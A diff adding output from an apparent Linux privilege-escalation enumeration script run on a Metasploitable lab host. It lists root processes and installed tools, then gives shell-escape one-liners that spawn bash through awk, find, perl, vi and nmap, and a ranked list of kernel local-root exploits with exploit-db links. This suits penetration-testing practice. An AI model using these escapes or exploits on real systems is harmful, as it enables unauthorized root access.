+    #ErrorDocument 404 "/cgi-bin/missing_handler.pl"
+    #ErrorDocument 402 http://www.example.com/subscription_info.html
+    #
+    #
+    # Putting this all together, we can internationalize error responses.
+    #
+    # We use Alias to redirect any /error/HTTP_<error>.html.var response to
+    # our collection of by-error message multi-language collections.  We use
+    # includes to substitute the appropriate text.
+    #
+    # You can modify the messages' appearance without changing any of the
+    # default HTTP_<error>.html.var files by adding the line:
+    #
+    #   Alias /error/include/ "/your/include/path/"
+    #
+    # which allows you to create your own set of files by starting with the
+    # /usr/share/apache2/error/include/ files and copying them to /your/include/path/,
+    # even on a per-VirtualHost basis.  The default include files will display
+    # your Apache version number and your ServerAdmin email address regardless
+    # of the setting of ServerSignature.
+    #
+    # The internationalized error documents require mod_alias, mod_include
+    # and mod_negotiation.  To activate them, uncomment the following 30 lines.
+    #    Alias /error/ "/usr/share/apache2/error/"
+    #
+    #    <Directory "/usr/share/apache2/error">
+    #        AllowOverride None
+    #        Options IncludesNoExec
+    #        AddOutputFilter Includes html
+    #        AddHandler type-map var
+    #        Order allow,deny
+    #        Allow from all
+    #        LanguagePriority en cs de es fr it nl sv pt-br ro
+    #        ForceLanguagePriority Prefer Fallback
+    #    </Directory>
+    #
+    #    ErrorDocument 400 /error/HTTP_BAD_REQUEST.html.var
+    #    ErrorDocument 401 /error/HTTP_UNAUTHORIZED.html.var
+    #    ErrorDocument 403 /error/HTTP_FORBIDDEN.html.var
+    #    ErrorDocument 404 /error/HTTP_NOT_FOUND.html.var
+    #    ErrorDocument 405 /error/HTTP_METHOD_NOT_ALLOWED.html.var
+    #    ErrorDocument 408 /error/HTTP_REQUEST_TIME_OUT.html.var
+    #    ErrorDocument 410 /error/HTTP_GONE.html.var
+    #    ErrorDocument 411 /error/HTTP_LENGTH_REQUIRED.html.var
+    #    ErrorDocument 412 /error/HTTP_PRECONDITION_FAILED.html.var
+    #    ErrorDocument 413 /error/HTTP_REQUEST_ENTITY_TOO_LARGE.html.var
+    #    ErrorDocument 414 /error/HTTP_REQUEST_URI_TOO_LARGE.html.var
+    #    ErrorDocument 415 /error/HTTP_UNSUPPORTED_MEDIA_TYPE.html.var
+    #    ErrorDocument 500 /error/HTTP_INTERNAL_SERVER_ERROR.html.var
+    #    ErrorDocument 501 /error/HTTP_NOT_IMPLEMENTED.html.var
+    #    ErrorDocument 502 /error/HTTP_BAD_GATEWAY.html.var
+    #    ErrorDocument 503 /error/HTTP_SERVICE_UNAVAILABLE.html.var
+    #    ErrorDocument 506 /error/HTTP_VARIANT_ALSO_VARIES.html.var
+    # Include of directories ignores editors' and dpkg's backup files,
+    # see README.Debian for details.
+    # Include generic snippets of statements
+    Include /etc/apache2/conf.d/
+    # Include the virtual host configurations:
+    Include /etc/apache2/sites-enabled/
+
+[+] Sudo Version (Check out http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=sudo)
+    Sudo version 1.6.9p10
+
+[*] IDENTIFYING PROCESSES AND PACKAGES RUNNING AS ROOT OR OTHER SUPERUSER...
+
+    root 7 19:09 0:00 [khelper]
+    root 1128 19:09 0:00 [ksnapd]
+    root 129 19:09 0:00 [pdflush]
+    root 4362 19:10 0:00 [nfsd]
+    root 2195 19:09 0:00 [scsi_eh_2]
+    root 4360 19:10 0:00 [nfsd]
+    root 4441 19:10 0:00 /usr/sbin/nmbd
+    root 2042 19:09 0:00 [scsi_eh_0]
+    root 4202 19:10 0:00 logger
+    root 4608 19:10 0:00 /bin/login
+        Possible Related Packages: 
+             login 1:4.0.18.2-1ubuntu2  login tools
+             openssh-client 1:4.7p1-8ubuntu1  shell client, an rlogin/rsh/rcp repla
+    root 5 19:09 0:00 [watchdog/0]
+    root 4356 19:10 0:00 [nfsd4]
+    root 4629 19:10 0:01 fluxbox
+        Possible Related Packages: 
+             fluxbox 1.1.1-1~hardy1  configurable and low resource X11 Win
+    root 130 19:09 0:00 [kswapd0]
+    root 4524 19:10 0:00 /usr/sbin/cron
+        Possible Related Packages: 
+             cron 3.0pl1-100ubuntu2  of regular background processing
+    root 2193 19:09 0:00 [scsi_eh_1]
+    root 4624 19:10 0:00 xterm
+        Possible Related Packages: 
+             xterm 229-1ubuntu1.1  terminal emulator
+    root 3515 19:10 0:00 [kjournald]
+    root 4593 19:10 0:00 /usr/bin/rmiregistry
+    root 2360 19:09 0:00 /sbin/udevd
+    root 1 19:09 0:01 /sbin/init
+        Possible Related Packages: 
+             busybox-initramfs 1:1.1.3-5ubuntu12  shell setup for initramfs
+             initramfs-tools 0.85eubuntu36  for generating an initramfs
+             initscripts 2.86.ds1-14.1ubuntu45  for initializing and shutting down t
+             libklibc 1.5.7-4ubuntu3  libc subset for use with initramfs
+             lsb-base 3.2-4ubuntu1  Standard Base 3.2 init script function
+             module-init-tools 3.3-pre11-4ubuntu5  for managing Linux kernel modules
+             upstart 0.3.9-2  init daemon
+             upstart-compat-sysv 0.3.9-2  for System-V-like init
+             xinit 1.0.7-2  server initialisation tool
+    root 4614 19:10 0:00 /usr/bin/unrealircd
+    root 2204 19:09 0:00 [kjournald]
+    root 1318 19:09 0:00 [ata/0]
+    root 4434 19:10 0:00 /usr/lib/postfix/master
+        Possible Related Packages: 
+             base-passwd 3.5.16  base system master password and group
+    root 172 19:09 0:00 [aio/0]
+    root 3682 19:10 0:00 /usr/sbin/rpc.idmapd
+    root 4574 19:10 0:00 /usr/sbin/apache2
+        Possible Related Packages: 
+             apache2 2.2.8-1  generation, scalable, extendable web se
+             apache2-mpm-prefork 2.2.8-1ubuntu0.15  model for Apache HTTPD
+             apache2-utils 2.2.8-1ubuntu0.15  programs for webservers
+             apache2.2-common 2.2.8-1ubuntu0.15  generation, scalable, extendable web se
+             libapache2-mod-php5 5.2.4-2ubuntu5.24  HTML-embedded scripting languag
+    root 1324 19:09 0:00 [ata_aux]
+    root 4009 19:10 0:00 /bin/dd
+    root 3915 19:10 0:00 /sbin/getty
+    root 3918 19:10 0:00 /sbin/getty
+    root 4358 19:10 0:00 [nfsd]
+    root 3667 19:10 0:00 [rpciod/0]
+    root 4612 19:10 0:01 Xtightvnc
+    root 4597 19:10 0:01 ruby
+        Possible Related Packages: 
+             libruby1.8 1.8.6.111-2ubuntu1.3  necessary to run Ruby 1.8
+             ruby 4.1  interpreter of object-oriented scripting
+             ruby1.8 1.8.6.111-2ubuntu1.3  of object-oriented scripting lan
+    root 4359 19:10 0:00 [nfsd]
+    root 45 19:09 0:00 [kacpi_notify]
+    root 4448 19:10 0:00 /usr/sbin/smbd
+    root 4363 19:10 0:00 [nfsd]
+    root 1347 19:09 0:00 [khubd]
+    root 4361 19:10 0:00 [nfsd]
+    root 4553 19:10 0:00 /usr/bin/jsvc
+        Possible Related Packages: 
+             jsvc 1.0.2~svn20061127-6  to launch Java applications as daemo
+    root 4357 19:10 0:00 [nfsd]
+    root 4355 19:10 0:00 [lockd]
+    root 4 19:09 0:00 [ksoftirqd/0]
+    root 3909 19:10 0:00 /sbin/getty
+    root 2574 19:10 0:00 [kpsmoused]
+    root 3921 19:10 0:00 /sbin/getty
+    root 128 19:09 0:00 [pdflush]
+    root 41 19:09 0:00 [kblockd/0]
+    root 4364 19:10 0:00 [nfsd]
+    root 4621 19:10 0:00 /bin/sh
+    root 3 19:09 0:00 [migration/0]
+    root 4663 19:10 0:00 -bash
+    root 1343 19:09 0:00 [ksuspend_usbd]
+    root 4552 19:10 0:00 /usr/bin/jsvc
+        Possible Related Packages: 
+             jsvc 1.0.2~svn20061127-6  to launch Java applications as daemo
+    root 2 19:09 0:00 [kthreadd]
+    root 6 19:09 0:00 [events/0]
+    root 90 19:09 0:00 [kseriod]
+    root 44 19:09 0:00 [kacpid]
+    root 5918 19:29 0:00 bash
+        Possible Related Packages: 
+             bash 3.2-0ubuntu16  GNU Bourne Again SHell
+             bash-completion 20060301-3ubuntu3  completion for the bash shell
+    root 4443 19:10 0:00 /usr/sbin/smbd
+    root 4158 19:10 0:00 /bin/sh
+    root 4082 19:10 0:00 /usr/sbin/sshd
+    root 4459 19:10 0:00 /usr/sbin/xinetd
+        Possible Related Packages: 
+             xinetd 1:2.3.14-5  for inetd with many enhancements
+    root 4368 19:10 0:00 /usr/sbin/rpc.mountd
+    root 3908 19:10 0:00 /sbin/getty
+
+[*] ENUMERATING INSTALLED LANGUAGES/TOOLS FOR SPLOIT BUILDING...
+
+[+] Installed Tools
+    /usr/bin/awk
+    /usr/bin/perl
+    /usr/bin/python
+    /usr/bin/ruby
+    /usr/bin/gcc
+    /usr/bin/cc
+    /usr/bin/vi
+    /usr/bin/vim
+    /usr/bin/nmap
+    /usr/bin/find
+    /bin/netcat
+    /bin/nc
+    /usr/bin/wget
+    /usr/bin/ftp
+
+[+] Related Shell Escape Sequences...
+
+    nmap-->	--interactive
+    vi-->	:!bash
+    vi-->	:set shell=/bin/bash:shell
+    vi-->	:!bash
+    vi-->	:set shell=/bin/bash:shell
+    awk-->	awk 'BEGIN {system("/bin/bash")}'
+    find-->	find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
+    perl-->	perl -e 'exec "/bin/bash";'
+
+[*] FINDING RELEVENT PRIVILEGE ESCALATION EXPLOITS...
+
+    Note: Exploits relying on a compile/scripting language not detected on this system are marked with a '**' but should still be tested!
+
+    The following exploits are ranked higher in probability of success because this script detected a related running process, OS, or mounted file system
+    - 2.6 UDEV < 141 Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/8572 || Language=c
+    - 2.6 UDEV Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/8478 || Language=c
+    - MySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/1518 || Language=c
+
+    The following exploits are applicable to this kernel version and should be investigated as well
+    - Kernel ia32syscall Emulation Privilege Escalation || http://www.exploit-db.com/exploits/15023 || Language=c
+    - < 2.6.29 exit_notify() Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/8369 || Language=c
+    - 2.4.1-2.4.37 and 2.6.1-2.6.32-rc5 Pipe.c Privelege Escalation || http://www.exploit-db.com/exploits/9844 || Language=python
+    - < 2.6.36-rc1 CAN BCM Privilege Escalation Exploit || http://www.exploit-db.com/exploits/14814 || Language=c
+    - 2.x sock_sendpage() Local Root Exploit 2 || http://www.exploit-db.com/exploits/9436 || Language=c
+    - open-time Capability file_ns_capable() - Privilege Escalation Vulnerability || http://www.exploit-db.com/exploits/25307 || Language=c
+    - 2.4/2.6 sock_sendpage() ring0 Root Exploit (simple ver) || http://www.exploit-db.com/exploits/9479 || Language=c
+    - 2.6 UDEV < 141 Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/8572 || Language=c
+    - 2.6.17 - 2.6.24.1 vmsplice Local Root Exploit || http://www.exploit-db.com/exploits/5092 || Language=c
+    - Linux Kernel <=2.6.28.3 set_selection() UTF-8 Off By One Local Exploit || http://www.exploit-db.com/exploits/9083 || Language=c
+    - 2.4/2.6 sock_sendpage() Local Root Exploit [2] || http://www.exploit-db.com/exploits/9598 || Language=c
+    - open-time Capability file_ns_capable() Privilege Escalation || http://www.exploit-db.com/exploits/25450 || Language=c
+    - CAP_SYS_ADMIN to Root Exploit 2 (32 and 64-bit) || http://www.exploit-db.com/exploits/15944 || Language=c
+    - Linux RDS Protocol Local Privilege Escalation || http://www.exploit-db.com/exploits/15285 || Language=c
+    - 2.6.x ptrace_attach Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/8673 || Language=c
+    - 2.x sock_sendpage() Local Ring0 Root Exploit || http://www.exploit-db.com/exploits/9435 || Language=c
+    - Test Kernel Local Root Exploit 0day || http://www.exploit-db.com/exploits/9191 || Language=c
+    - 2.4/2.6 bluez Local Root Privilege Escalation Exploit (update) || http://www.exploit-db.com/exploits/926 || Language=c
+    - CAP_SYS_ADMIN to root Exploit || http://www.exploit-db.com/exploits/15916 || Language=c
+    - 2.4/2.6 sock_sendpage() Local Root Exploit (ppc) || http://www.exploit-db.com/exploits/9545 || Language=c
+    - 2.6 UDEV Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/8478 || Language=c
+    - MySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/1518 || Language=c
+    - < 2.6.36.2 Econet Privilege Escalation Exploit || http://www.exploit-db.com/exploits/17787 || Language=c
+    - Sendpage Local Privilege Escalation || http://www.exploit-db.com/exploits/19933 || Language=ruby
+    - < 2.6.37-rc2 ACPI custom_method Privilege Escalation || http://www.exploit-db.com/exploits/15774 || Language=c
+    - 'pipe.c' Local Privilege Escalation Vulnerability || http://www.exploit-db.com/exploits/10018 || Language=sh
+    - 2.4/2.6 sock_sendpage() Local Root Exploit [3] || http://www.exploit-db.com/exploits/9641 || Language=c
+    - <= 2.6.37 Local Privilege Escalation || http://www.exploit-db.com/exploits/15704 || Language=c
+    - 2.4.x / 2.6.x uselib() Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/895 || Language=c
+
+Finished
+=================================================================================================
+root@metasploitable:/# exit
